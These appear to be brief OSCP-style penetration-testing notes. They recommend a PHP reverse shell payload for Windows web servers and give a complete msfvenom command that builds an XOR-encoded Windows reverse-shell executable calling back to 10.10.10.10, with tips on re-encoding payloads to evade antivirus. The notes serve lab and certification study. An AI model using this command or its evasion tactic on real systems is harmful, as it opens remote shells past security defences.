# Reverse Shell Windows

Which reverse shell do we use for a stable shell on a Windows machine if the web server runs PHP?

Choose PHP Ivan Sincek payload found on resources like revshells.com.

# AV Evasion

In OSCP labs, msfvenom should be enough

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -e x64/xor_dynamic -i 5 -o reverse.exe

When a payload fails, try the same payload encoded. This simple tactic is a key time-saver.
